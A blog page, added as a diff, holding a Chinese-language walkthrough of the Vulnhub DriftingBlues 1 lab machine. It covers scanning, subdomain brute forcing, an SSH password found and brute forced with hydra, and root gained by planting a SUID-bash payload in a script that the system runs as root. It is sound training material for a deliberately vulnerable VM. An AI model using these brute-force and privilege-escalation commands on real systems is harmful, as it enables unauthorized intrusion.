@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="rowen">
+
+
+
+
+
+<title>【渗透测试】Vulnhub driftingblues 1 | Hexo</title>
+
+
+
+    <link rel="icon" href="/drink.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+ <script type="text/javascript" src="/js/snow2.js"></script>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+<script>
+!
+function() {
+function n(n, e, t) {
+return n.getAttribute(e) || t
+}
+function e(n) {
+return document.getElementsByTagName(n)
+}
+function t() {
+var t = e("script"),
+o = t.length,
+i = t[o - 1];
+return {
+l: o,
+z: n(i, "zIndex", -1), //置于主页面背后
+o: n(i, "opacity", .5), //线条透明度
+c: n(i, "color", "0,0,0"), //线条颜色
+n: n(i, "count", 100) //线条数量
+}
+}
+function o() {
+a = m.width = window.innerWidth ||
+document.documentElement.clientWidth || document.body.clientWidth,
+c = m.height = window.innerHeight ||
+document.documentElement.clientHeight || document.body.clientHeight
+}
+function i() {
+r.clearRect(0, 0, a, c);
+var n, e, t, o, m, l;
+s.forEach(function(i, x) {
+for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 :
+1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1,
+1), e = x + 1; e < u.length; e++) n = u[e],
+null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l
+= o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o,
+i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t /
+2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y),
+r.lineTo(n.x, n.y), r.stroke()))
+}),
+x(i)
+}
+var a, c, u, m = document.createElement("canvas"),
+d = t(),
+l = "c_n" + d.l,
+r = m.getContext("2d"),
+x = window.requestAnimationFrame || window.webkitRequestAnimationFrame
+|| window.mozRequestAnimationFrame || window.oRequestAnimationFrame ||
+window.msRequestAnimationFrame ||
+function(n) {
+window.setTimeout(n, 1e3 / 45)
+},
+w = Math.random,
+y = {
+x: null,
+y: null,
+max: 2e4
+};
+m.id = l,
+m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z +
+";opacity:" + d.o,
+e("body")[0].appendChild(m),
+o(),
+window.onresize = o,
+window.onmousemove = function(n) {
+n = n || window.event,
+y.x = n.clientX,
+y.y = n.clientY
+},
+window.onmouseout = function() {
+y.x = null,
+y.y = null
+};
+for (var s = [], f = 0; d.n > f; f++) {
+var h = w() * a,
+g = w() * c,
+v = 2 * w() - 1,
+p = 2 * w() - 1;
+s.push({
+x: h,
+y: g,
+xa: v,
+ya: p,
+max: 6e3
+})
+}
+u = s.concat([y]),
+setTimeout(function() {
+i()
+},
+100)
+} ();
+</script>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">bobo&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">bobo&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">【渗透测试】Vulnhub driftingblues 1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">rowen</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 17, 2025&nbsp;&nbsp;19:09:34</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="【渗透测试】Vulnhub-driftingblues-1"><a href="#【渗透测试】Vulnhub-driftingblues-1" class="headerlink" title="【渗透测试】Vulnhub driftingblues 1"></a>【渗透测试】Vulnhub driftingblues 1</h1><h2 id="一-渗透环境环境准备"><a href="#一-渗透环境环境准备" class="headerlink" title="一.渗透环境环境准备"></a>一.渗透环境环境准备</h2><p><strong>靶机描述</strong></p>
+<p><strong>Vulnhub靶机下载：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/driftingblues-1,625/">https://www.vulnhub.com/entry/driftingblues-1,625/</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机ip：192.168.243.128(kali)</span><br><span class="line">靶机ip：192.168.243.131 （driftingblues）</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：靶机与Kali的IP地址只需要在同一局域网即可（同一个网段,即两虚拟机处于同一网络模式）</strong></p>
+<p>下载好靶机之后直接使用VMware Workstation Pro虚拟机导入环境，启动即可，将网段设置为NAT模式 目标：获取目标靶机root目录下的flag</p>
+<p><strong>开始渗透</strong></p>
+<h2 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二. 信息收集"></a>二. 信息收集</h2><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/ed7f0a86a0d3fc28.png" alt="ed7f0a86a0d3fc28.png"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>使用<strong>nmap</strong>获取目标靶机开放的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -sC -p- 192.168.243.131 -oN nmap_full_scan</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/eb1e51c0ba7c9f57.png" alt="eb1e51c0ba7c9f57.png"></p>
+<p>当前扫描揭示了 <strong>SSH（22）</strong> 和 <strong>HTTP（80）</strong> 两个开放服务</p>
+<h3 id="漏洞扫描和目录扫描"><a href="#漏洞扫描和目录扫描" class="headerlink" title="漏洞扫描和目录扫描"></a>漏洞扫描和目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p21,80,55077 192.168.243.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/672e643966cbce8d.png" alt="672e643966cbce8d.png"></p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/d9aadd5bbbaaeb63.png" alt="d9aadd5bbbaaeb63.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch  -u 192.168.243.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/b8752c280d1199c6.png" alt="b8752c280d1199c6.png"></p>
+<p>  综上可以看到有漏洞</p>
+<p><strong>80 端口（Apache&#x2F;2.4.18）开放，存在 Slowloris DoS 漏洞（CVE-2007-6750）、可能的 CSRF 漏洞、可能的 SQL 注入漏洞（&#x2F;js&#x2F; 目录参数）及 &#x2F;css&#x2F;、&#x2F;img&#x2F;、&#x2F;js&#x2F; 目录列表信息泄露，21 和 55077 端口关闭。</strong></p>
+<h2 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h2><h3 id="网页测试"><a href="#网页测试" class="headerlink" title="网页测试"></a>网页测试</h3><p>我们去访问</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.243.131/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/204ef0cefb2c94c6.png" alt="204ef0cefb2c94c6.png"></p>
+<p>我们查看源码（CTRL+U）：其他办法也可以，我觉得这个比较快</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/ecc51721962194d1.png" alt="ecc51721962194d1.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> L25vdGVmb3JraW5nZmlzaC50eHQ= </span><br><span class="line">给他base64解码得到</span><br><span class="line">/noteforkingfish.txt</span><br></pre></td></tr></table></figure>
+
+<p>我们访问看看</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.243.131/noteforkingfish.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/faa196aa80a558ef.png" alt="faa196aa80a558ef.png"></p>
+<p>一堆ook 加密我们找网站解密去 </p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.splitbrain.org/services/ook</span><br></pre></td></tr></table></figure>
+
+<p>把密码复制进去点击 <code>Ook! to Text</code>按钮</p>
+<p>解密文本如下</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/faed21586fab88db.png" alt="faed21586fab88db.png"></p>
+<p>我们根据这个提示来结合首页的域名</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/c66531d0504e85c0.png" alt="c66531d0504e85c0.png"></p>
+<h3 id="添加host"><a href="#添加host" class="headerlink" title="添加host"></a>添加host</h3><p>接下来我们去配置本地host： &#x2F;etc&#x2F;hosts</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>增加192.168.243.131 driftingblues.box这一项数据进去</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/7c5b93663bffcbca.png" alt="7c5b93663bffcbca.png"></p>
+<p>在vim 中 插入（按键盘上‘i’字符）修改好后我们 按‘ESC’ </p>
+<p>之后shift +；（键盘上的）记得 要是<strong>英文输入法下</strong></p>
+<p>之后输入wq (退出并保存)</p>
+<p>我们校验一下看有没有写进去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/5ff8e05765382e11.png" alt="5ff8e05765382e11.png"></p>
+<h3 id="爆破子域名"><a href="#爆破子域名" class="headerlink" title="爆破子域名"></a>爆破子域名</h3><p>可以看出，已经写入了</p>
+<p>但这个域名肯定不是要求的那个域名，我们去破解一下子域名，</p>
+<p>使用 gobuster 爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gobuster vhost -u driftingblues.box --wordlist /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure>
+
+<p>这里我卡了好久，首先你要是 Gobuster v3.1.0 版本（建议去github 去下）最新版复现不出</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/OJ/gobuster/releases/download/v3.0.1/gobuster-linux-386.7z</span><br></pre></td></tr></table></figure>
+
+<p>不然你使用命令就 回显不对爆破不了子域名</p>
+<p>这里我们弄好了这里是正常回显</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/02d8c089e7bc6601.png" alt="02d8c089e7bc6601.png"></p>
+<p>回显 200（Status: 200）</p>
+<p>成功得到子域名<code>test.driftingblues.box</code>,添加到<code>hosts</code>文件</p>
+<p>还是和上面同样步骤</p>
+<h3 id="继续添加host"><a href="#继续添加host" class="headerlink" title="继续添加host"></a>继续添加host</h3><p>首先</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>进入后更改之后我们确认是否写入了</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/87c38530f14e2ace.png" alt="87c38530f14e2ace.png"></p>
+<p>这里其实最好reboot一下</p>
+<h3 id="访问子域名"><a href="#访问子域名" class="headerlink" title="访问子域名"></a>访问子域名</h3><p>接下来我们去访问<code>http://test.driftingblues.box</code></p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/22b1fcd6d4155404.png" alt="22b1fcd6d4155404.png"></p>
+<p>使用命令扫描目录看看有什么漏洞文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch  -u http://test.driftingblues.box</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/2362798b6e151d68.png" alt="2362798b6e151d68.png"></p>
+<p>访问 &#x2F;robots.txt 文件</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/feeeab613969f87c.png" alt="feeeab613969f87c.png"></p>
+<p>发现一个文件：<code>ssh_cred.txt</code> 盲猜是ssh 连接密码</p>
+<p>去看看</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/955a90ee08062bed.png" alt="955a90ee08062bed.png"></p>
+<p>得到ssh密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1mw4ckyyucky</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>密码修改规则</strong>：</li>
+</ol>
+<ul>
+<li><strong>Sheryl</strong> 在密码末尾添加了一个 <strong>数字</strong>（0-9 中的某一个，共 10 种可能）。</li>
+<li>例如：<code>1mw4ckyyucky0</code>、<code>1mw4ckyyucky1</code> …… <code>1mw4ckyyucky9</code>。</li>
+</ul>
+<p>到此用户名和密码都有了，用户名为<code> eric</code>（前面提醒好几次了），密码可能是</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1mw4ckyyucky0</span><br><span class="line">1mw4ckyyucky1</span><br><span class="line">1mw4ckyyucky2</span><br><span class="line">1mw4ckyyucky3</span><br><span class="line">1mw4ckyyucky4</span><br><span class="line">1mw4ckyyucky5</span><br><span class="line">1mw4ckyyucky6</span><br><span class="line">1mw4ckyyucky7</span><br><span class="line">1mw4ckyyucky8</span><br><span class="line">1mw4ckyyucky9</span><br></pre></td></tr></table></figure>
+
+<p>将上面保存为字典pass.txt，然后尝试暴力破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l eric -P pass.txt ssh://192.168.243.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/6cf5719359f52fce.png" alt="6cf5719359f52fce.png"></p>
+<p>得到账户密码</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login: eric</span><br><span class="line">password: 1mw4ckyyucky6</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH-连接"><a href="#SSH-连接" class="headerlink" title="SSH 连接"></a>SSH 连接</h3><p><strong>登陆 SSH 获取 shell</strong></p>
+<p>利用上面得到的账户密码登录ssh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh eric@192.168.243.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/7f92a36076dfd491.png" alt="7f92a36076dfd491.png"></p>
+<p> 也是成功登录上了 （wuwuwu~~~）</p>
+<h2 id="四-提权过程"><a href="#四-提权过程" class="headerlink" title="四.提权过程"></a>四.提权过程</h2><h3 id="寻找-suid-程序"><a href="#寻找-suid-程序" class="headerlink" title="寻找 suid 程序"></a>寻找 suid 程序</h3><p>在 shell 中寻找 suid 程序：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/8f2951c962f6deef.png" alt="8f2951c962f6deef.png"></p>
+<h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>第一个flag（彩蛋）</p>
+<p>当前目录 user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> user.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/ab021d02f057271a.png" alt="ab021d02f057271a.png"></p>
+<p>tmp目录里面有</p>
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/44251714d955dba5.png" alt="44251714d955dba5.png"></p>
+<p><code>backup.zip</code></p>
+<p>去到目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> backup.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/7a6989143783368c.png" alt="7a6989143783368c.png"></p>
+<p>这里有调用过 backup.zip的痕迹</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#having a backdoor would be nice</span></span><br><span class="line">sudo /tmp/emergency</span><br></pre></td></tr></table></figure>
+
+<p>结合backup.sh脚本中最后一句，会sudo执行&#x2F;tmp&#x2F;emergency文件，而此时&#x2F;tmp下没有这个文件，我们可以手工创建文件，并将eric用户加入sudo组</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/getroot; chmod +s /tmp/getroot&#x27;</span> &gt; /tmp/emergency</span><br><span class="line"><span class="built_in">chmod</span> +x emergency</span><br><span class="line">./getroot -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://c.img.dasctf.com/LightPicture/2025/07/00df6bc112451e39.png" alt="00df6bc112451e39.png"></p>
+<p>提权成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cat</span> *</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p><img src="https://c.img.dasctf.com/LightPicture/2025/07/c0c5e74dbc1c405d.png" alt="c0c5e74dbc1c405d.png"></p>
+<p>总结：</p>
+<p>本节通过主要靠信息收集，非常适合作为信息收集练习</p>
+<p>这个靶机收获很多</p>
+<p>添加host 解析</p>
+<p>还有gobuster爆破子域名</p>
+<p>后面的利用自动任务提权还不是很熟</p>
+<p>备份文件路径还不熟悉</p>
+<p>（刚开始打这个靶机 感觉很熟悉，找了下写的笔记，发现是去年写了一半复现不出了，卡在那个gobuster 爆破哪了 ，才发现是版本问题hhh）</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>rowen</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2025/07/17/Vulnhub-driftingblues-1/">http://example.com/2025/07/17/Vulnhub-driftingblues-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"># 网络安全</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F/"># 渗透</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/07/15/Android%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE%E8%AE%A1%E7%AE%97%E5%99%A8/">Android实战项目计算器</a>
+            
+        </section>
+<script src="https://giscus.app/client.js"
+        data-repo="forkmmat/forkmmat.github.io"
+        data-repo-id="R_kgDOO0OA0g"
+        data-category="General"
+        data-category-id="DIC_kwDOO0OA0s4CtD6Y"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© rowen | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
